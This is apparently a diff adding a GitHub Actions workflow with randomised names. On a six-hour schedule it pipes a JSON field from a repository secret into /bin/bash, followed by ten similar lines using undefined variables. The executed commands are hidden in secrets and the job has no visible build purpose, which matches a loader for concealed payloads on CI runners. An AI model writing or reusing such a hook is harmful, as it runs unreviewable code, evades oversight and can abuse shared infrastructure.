@@ -1,0 +1,28 @@
+name: luojingxin6718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luojingxin6718
+        env:
+          rq83: ${{ secrets.rq83 }}
+        run: |
+          echo $rq83 | jq -r .yr71 | /bin/bash
+          echo $qrfjt32622 | jq -r .wz417 | /bin/bash
+          echo $sdij89 | jq -r .i39 | /bin/bash
+          echo $lto8 | jq -r .ocwn408 | /bin/bash
+          echo $q16 | jq -r .lkytt25023 | /bin/bash
+          echo $ssjl41626 | jq -r .nx889 | /bin/bash
+          echo $wn4632 | jq -r .et408 | /bin/bash
+          echo $h853 | jq -r .gwjh5551 | /bin/bash
+          echo $zqmy67625 | jq -r .num39 | /bin/bash
+          echo $qaoh33157 | jq -r .jk6792 | /bin/bash
+          echo $lpq41047 | jq -r .i568 | /bin/bash
+
